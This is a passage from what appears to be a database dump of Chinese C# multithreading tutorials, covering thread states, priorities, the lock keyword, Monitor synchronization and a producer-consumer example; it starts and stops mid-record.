/>\r\n}</p>\r\n\r\n<p>这段程序包含两个类Alpha和Simple，在创建线程oThread时我们用指向Alpha.Beta()方法的初始化了ThreadStart代理（delegate）对象，当我们创建的线程oThread</p>\r\n\r\n<p>调用oThread.Start()方法启动时，实际上程序运行的是Alpha.Beta()方法：<br />\r\nAlpha oAlpha = new Alpha();<br />\r\nThread oThread = new Thread(new ThreadStart(oAlpha.Beta));<br />\r\noThread.Start();<br />\r\n&nbsp;<br />\r\n然后在Main()函数的while循环中，我们使用静态方法Thread.Sleep()让主线程停了1ms，这段时间CPU转向执行线程oThread。然后我们试图用Thread.Abort()方法终</p>\r\n\r\n<p>止线程oThread，注意后面的oThread.Join()，Thread.Join()方法使主线程等待，直到oThread线程结束。你可以给Thread.Join()方法指定一个int型的参数作为等待</p>\r\n\r\n<p>的最长时间。之后，我们试图用Thread.Start()方法重新启动线程oThread，但是显然Abort()方法带来的后果是不可恢复的终止线程，所以最后程序会抛出</p>\r\n\r\n<p>ThreadStateException异常。</p>\r\n\r\n<p>主线程Main()函数<br />\r\n所有线程都是依附于Main()函数所在的线程的，Main()函数是C#程序的入口，起始线程可以称之为主线程。<br />\r\n如果所有的前台线程都停止了，那么主线程可以终止，而所有的后台线程都将无条件终止。<br />\r\n所有的线程虽然在微观上是串行执行的，但是在宏观上你完全可以认为它们在并行执行。</p>\r\n\r\n<p>Thread.ThreadState 属性<br />\r\n这个属性代表了线程运行时状态，在不同的情况下有不同的值，我们有时候可以通过对该值的判断来设计程序流程。<br />\r\nThreadState 属性的取值如下：<br />\r\nAborted：线程已停止；<br />\r\nAbortRequested：线程的Thread.Abort()方法已被调用，但是线程还未停止；<br />\r\nBackground：线程在后台执行，与属性Thread.IsBackground有关；<br />\r\nRunning：线程正在正常运行；<br />\r\nStopped：线程已经被停止；<br />\r\nStopRequested：线程正在被要求停止；<br />\r\nSuspended：线程已经被挂起（此状态下，可以通过调用Resume()方法重新运行）；<br />\r\nSuspendRequested：线程正在要求被挂起，但是未来得及响应；<br />\r\nUnstarted：未调用Thread.Start()开始线程的运行；<br />\r\nWaitSleepJoin：线程因为调用了Wait(),Sleep()或Join()等方法处于封锁状态；<br />\r\n上面提到了Background状态表示该线程在后台运行，那么后台运行的线程有什么特别的地方呢？其实后台线程跟前台线程只有一个区别，那就是后台线程不妨碍程序</p>\r\n\r\n<p>的终止。一旦一个进程所有的前台线程都终止后，CLR（通用语言运行环境）将通过调用任意一个存活中的后台进程的Abort()方法来彻底终止进程。</p>\r\n\r\n<p>线程的优先级<br />\r\n当线程之间争夺CPU时间时，CPU 是按照线程的优先级给予服务的。在C#应用程序中，用户可以设定5个不同的优先级，由高到低分别是Highest，AboveNormal，</p>\r\n\r\n<p>Normal，BelowNormal，Lowest，在创建线程时如果不指定优先级，那么系统默认为ThreadPriority.Normal。<br />\r\n给一个线程指定优先级，我们可以使用如下代码：<br />\r\n//设定优先级为最低<br />\r\nmyThread.Priority=ThreadPriority.Lowest;<br />\r\n通过设定线程的优先级，我们可以安排一些相对重要的线程优先执行，例如对用户的响应等等。</p>\r\n',0,1438006693,0,0),(86,38,'C#多线程学习(三) 生产者和消费者','<p>前面说过，每个线程都有自己的资源，但是代码区是共享的，即每个线程都可以执行相同的函数。这可能带来的问题就是几个线程同时执行一个函数，导致数据的混乱，产生不可预料的结果，因此我们必须避免这种情况的发生。</p>\r\n\r\n<p>C#提供了一个关键字lock，它可以把一段代码定义为互斥段（critical section），互斥段在一个时刻内只允许一个线程进入执行，而其他线程必须等待。在C#中，关键字lock定义如下：<br />\r\nlock(expression) statement_block<br />\r\n&nbsp;<br />\r\nexpression代表你希望跟踪的对象，通常是对象引用。<br />\r\n&nbsp;&nbsp;&nbsp; 如果你想保护一个类的实例，一般地，你可以使用this；<br />\r\n&nbsp;&nbsp;&nbsp; 如果你想保护一个静态变量（如互斥代码段在一个静态方法内部），一般使用类名就可以了。<br />\r\n而statement_block就是互斥段的代码，这段代码在一个时刻内只可能被一个线程执行。</p>\r\n\r\n<p>下面是一个使用lock关键字的典型例子，在注释里说明了lock关键字的用法和用途。<br />\r\n示例如下：<br />\r\nusing System;<br />\r\nusing System.Threading;</p>\r\n\r\n<p>namespace ThreadSimple<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; internal class Account<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int balance;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Random r = new Random();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; internal Account(int initial)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; balance = initial;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; internal int Withdraw(int amount)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (balance &lt; 0)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //如果balance小于0则抛出异常<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; throw new Exception(&quot;Negative Balance&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //下面的代码保证在当前线程修改balance的值完成之前<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //不会有其他线程也执行这段代码来修改balance的值<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //因此，balance的值是不可能小于0 的<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lock (this)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Current Thread:&quot;+Thread.CurrentThread.Name);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //如果没有lock关键字的保护，那么可能在执行完if的条件判断之后<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //另外一个线程却执行了balance=balance-amount修改了balance的值<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //而这个修改对这个线程是不可见的，所以可能导致这时if的条件已经不成立了<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //但是，这个线程却继续执行balance=balance-amount，所以导致balance可能小于0<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (balance &gt;= amount)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread.Sleep(5);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; balance = balance - amount;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return amount;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 0; // transaction rejected<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; internal void DoTransactions()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 100; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Withdraw(r.Next(-50, 100));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; internal class Test<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; static internal Thread[] threads = new Thread[10];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void Main()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Account acc = new Account (0);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 10; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Thread t = new Thread(new ThreadStart(acc.DoTransactions));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; threads[i] = t;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 10; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; threads[i].Name=i.ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 10; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; threads[i].Start();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.ReadLine();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p><br />\r\nMonitor 类锁定一个对象<br />\r\n当多线程公用一个对象时，也会出现和公用代码类似的问题，这种问题就不应该使用lock关键字了，这里需要用到System.Threading中的一个类Monitor，我们可以称之为监视器，Monitor提供了使线程共享资源的方案。<br />\r\nMonitor类可以锁定一个对象，一个线程只有得到这把锁才可以对该对象进行操作。对象锁机制保证了在可能引起混乱的情况下一个时刻只有一个线程可以访问这个对象。<br />\r\nMonitor必须和一个具体的对象相关联，但是由于它是一个静态的类，所以不能使用它来定义对象，而且它的所有方法都是静态的，不能使用对象来引用。下面代码说明了使用Monitor锁定一个对象的情形：<br />\r\n......<br />\r\nQueue oQueue=new Queue();<br />\r\n......<br />\r\nMonitor.Enter(oQueue);<br />\r\n......//现在oQueue对象只能被当前线程操纵了<br />\r\nMonitor.Exit(oQueue);//释放锁<br />\r\n&nbsp;<br />\r\n如上所示，当一个线程调用Monitor.Enter()方法锁定一个对象时，这个对象就归它所有了，其它线程想要访问这个对象，只有等待它使用Monitor.Exit()方法释放锁。为了保证线程最终都能释放锁，你可以把Monitor.Exit()方法写在try-catch-finally结构中的finally代码块里。<br />\r\n对于任何一个被Monitor锁定的对象，内存中都保存着与它相关的一些信息:<br />\r\n其一是现在持有锁的线程的引用;<br />\r\n其二是一个预备队列，队列中保存了已经准备好获取锁的线程;<br />\r\n其三是一个等待队列，队列中保存着当前正在等待这个对象状态改变的队列的引用。<br />\r\n当拥有对象锁的线程准备释放锁时，它使用Monitor.Pulse()方法通知等待队列中的第一个线程，于是该线程被转移到预备队列中，当对象锁被释放时，在预备队列中的线程可以立即获得对象锁。</p>\r\n\r\n<p>下面是一个展示如何使用lock关键字和Monitor类来实现线程的同步和通讯的例子，也是一个典型的生产者与消费者问题。<br />\r\n这个例程中，生产者线程和消费者线程是交替进行的，生产者写入一个数，消费者立即读取并且显示（注释中介绍了该程序的精要所在）。<br />\r\n用到的系统命名空间如下：<br />\r\nusing System;<br />\r\nusing System.Threading;<br />\r\n首先，定义一个被操作的对象的类Cell，在这个类里，有两个方法：ReadFromCell()和WriteToCell。消费者线程将调用ReadFromCell()读取cellContents的内容并且显示出来，生产者进程将调用WriteToCell()方法向cellContents写入数据。</p>\r\n\r\n<p>示例如下：<br />\r\npublic class Cell<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int cellContents; // Cell对象里边的内容<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool readerFlag = false; // 状态标志，为true时可以读取，为false则正在写入<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public int ReadFromCell( )<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lock(this) // Lock关键字保证了什么，请大家看前面对lock的介绍<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!readerFlag)//如果现在不可读取<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //等待WriteToCell方法中调用Monitor.Pulse()方法<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Monitor.Wait(this);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (SynchronizationLockException e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(e);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (ThreadInterruptedException e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(e);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Consume: {0}&quot;,cellContents);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; readerFlag = false;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //重置readerFlag标志，表示消费行为已经完成<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Monitor.Pulse(this);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //通知WriteToCell()方法（该方法在另外一个线程中执行，等待中）<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return cellContents;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public void WriteToCell(int n)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lock(this)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (readerFlag)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; try<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Monitor.Wait(this);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (SynchronizationLockException e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //当同步方法（指Monitor类除Enter之外的方法）在非同步的代码区被调用<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(e);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; catch (ThreadInterruptedException e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //当线程在等待状态的时候中止<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(e);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cellContents = n;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Console.WriteLine(&quot;Produce: {0}&quot;,cellContents);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; readerFlag = true;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Monitor.Pulse(this);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //通知另外一个线程中正在等待的ReadFromCell()方法<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>下面定义生产者类 CellProd 和消费者类 CellCons 